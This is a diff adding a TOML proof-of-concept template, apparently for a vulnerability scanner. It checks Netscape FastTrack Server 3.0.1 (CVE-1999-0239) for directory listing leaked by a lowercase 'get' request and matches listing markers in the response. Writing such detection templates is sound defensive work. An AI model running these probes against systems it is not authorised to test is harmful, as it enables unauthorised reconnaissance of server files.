@@ -1,0 +1,33 @@
+[info]
+author = "ave"
+description = "Netscape FastTrack Server 3.0.1 存在 HTTP 方法大小写处理漏洞，使用小写 get 请求根目录时服务器错误返回文件列表，导致目录结构泄露。攻击者无需认证即可远程利用此漏洞获取服务器敏感文件和目录信息。"
+id = "POC-AVE-1999-0424"
+name = "Netscape FastTrack Server 3.0.1 Directory Listing PoC"
+severity = "high"
+tags = ["ave-1999-0424"]
+vuln_id = [
+    "CVE-1999-0239",
+    "AVE-1999-0424",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "get"
+path = "/{{BaseURL}}/"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "<title>Index of</title>",
+    "<DIR>",
+    "<dir>",
+    "Volume in drive",
+]
